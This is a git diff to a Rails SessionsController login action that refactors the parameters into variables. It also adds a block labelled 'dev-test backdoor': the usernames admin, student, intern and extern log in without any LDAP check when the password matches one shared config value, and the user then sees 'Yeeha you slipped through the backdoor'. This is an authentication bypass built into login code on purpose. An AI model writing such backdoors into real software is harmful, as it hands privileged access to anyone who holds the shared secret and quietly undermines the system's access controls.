@@ -5,11 +5,22 @@ class SessionsController < ApplicationController
   end
 
   def create
+    nds = params[:user][:nds]
+    password = params[:user][:password]
     # look if a user with that nds exists
-    user = User.where(:nds => params[:user][:nds]).first
+    user = User.where(:nds => nds).first
+
+    # dev-test backdoor
+    #---------------------------------------------
+      if %w(admin student intern extern).member?(nds) && password == LDAP_CONFIG["backdoor"]
+        session[:user_id] = user.id
+        redirect_to root_url, :notice => "Yeeha you slipped through the backdoor"
+        return
+      end
+    #---------------------------------------------
     ldap = Ldap.new
     if user && user.dn
-      if ldap.authenticate(user.dn, params[:user][:password])
+      if ldap.authenticate(user.dn, password)
         # successfully authenticated
         session[:user_id] = user.id
         redirect_to root_url, :notice => "Successfully logged in!"
@@ -18,8 +29,8 @@ class SessionsController < ApplicationController
         redirect_to new_session_url, :error => "Login failed"
       end
     else
-      data = ldap.fetchData(params[:user][:nds])
-      if ldap.authenticate(data.dn, params[:user][:password])
+      data = ldap.fetchData(nds)
+      if ldap.authenticate(data.dn, password)
         # successfully authenticated
         user = User.create_with_ldap!(data)
         if user
